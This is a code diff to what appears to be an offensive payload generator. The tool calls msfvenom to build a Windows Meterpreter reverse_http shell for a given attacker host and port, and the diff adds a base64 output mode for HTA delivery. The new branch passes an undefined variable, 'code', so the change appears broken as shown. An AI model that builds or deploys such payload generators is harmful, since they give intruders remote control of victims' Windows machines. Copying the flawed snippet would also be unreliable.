@@ -16,6 +16,8 @@ class Generator():
 			form = "c"
 		elif shellProcess == 'decEncode':
 			form = "vba"
+		elif shellProcess == 'b64Encode':
+			form = "raw"
 		
 		if (arch  == "x86"):
 			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
@@ -31,6 +33,8 @@ class Generator():
 			shellcode = self.hexEncode(shellcode)
 		elif shellProcess == 'decEncode':
 			shellcode = self.decEncode(shellcode)
+		elif shellProcess == 'b64Encode':
+			shellcode = self.b64Encode(code)
 
 		return shellcode
 
@@ -44,6 +48,11 @@ class Generator():
 
 		return shellcode
 
+	def b64Encode(self, code):
+		#HTA-Shellcode
+		shellcode = str(base64.b64encode(code))
+		shellcode = shellcode[2:-1]
+		return shellcode
 
 	def decEncode(self, shellcode):
 		#currently used for SCT based payloads
